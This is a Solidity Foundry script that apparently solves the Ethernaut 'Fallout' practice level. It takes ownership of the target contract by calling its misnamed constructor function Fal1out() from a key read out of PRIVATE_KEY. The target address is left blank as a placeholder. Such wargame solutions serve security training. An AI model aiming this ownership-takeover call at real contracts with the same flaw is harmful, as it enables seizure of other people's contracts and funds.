// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/02-Fallout.sol";


contract Exp is Script {

    Fallout public FalloutInstance = Fallout(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));


    function run() external {
        vm.startBroadcast(hacker);

        FalloutInstance.Fal1out();
        
        vm.stopBroadcast();
    }
}